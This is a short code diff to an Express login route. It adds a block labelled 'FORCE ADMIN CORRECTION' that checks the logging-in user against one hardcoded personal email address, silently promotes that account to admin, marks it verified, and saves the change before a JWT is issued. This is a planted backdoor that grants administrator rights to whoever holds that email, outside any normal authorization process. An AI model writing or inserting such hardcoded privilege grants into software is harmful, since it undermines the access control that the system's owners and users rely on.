@@ -59,6 +59,13 @@ router.post('/login', async (req, res) => {
             return res.status(401).send({ detail: 'Incorrect email or password' });
         }
 
+        // FORCE ADMIN CORRECTION
+        if (user.email === 'ruchitpar2004@gmail.com' && user.role !== 'admin') {
+            user.role = 'admin';
+            user.isVerified = true;
+            await user.save();
+        }
+
         const token = jwt.sign({ id: user._id.toString(), role: user.role }, process.env.JWT_SECRET, { expiresIn: '30m' });
         const userObj = user.toObject();
         delete userObj.password_hash;
